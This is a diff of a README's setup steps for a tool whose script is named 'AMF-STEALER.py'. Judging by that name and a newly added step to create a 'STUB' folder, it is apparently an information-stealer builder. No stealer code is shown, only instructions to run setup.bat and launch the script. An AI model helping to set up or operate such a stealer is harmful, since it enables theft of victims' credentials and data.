@@ -8,12 +8,14 @@
 1. **Run `setup.bat`**  
    Double-click on `setup.bat` to download and install all required dependencies.
 
-2. **Open Command Prompt in the Project Directory**
+2. **CREATE FODLER CALLED "STUB"**
+
+3. **Open Command Prompt in the Project Directory**
    - Open the folder containing `AMF-STEALER.py` in **File Explorer**.
    - Click on the **URL bar** in File Explorer and type `cmd`, then press **Enter**. This will open a Command Prompt window in the current directory.
    - You can view an example of this step [here](https://imgur.com/a/LyTfPW7).
 
-3. **Run the Script**
+4. **Run the Script**
    - In the Command Prompt, type the following command and press **Enter**:
      ```bash
      python AMF-STEALER.py
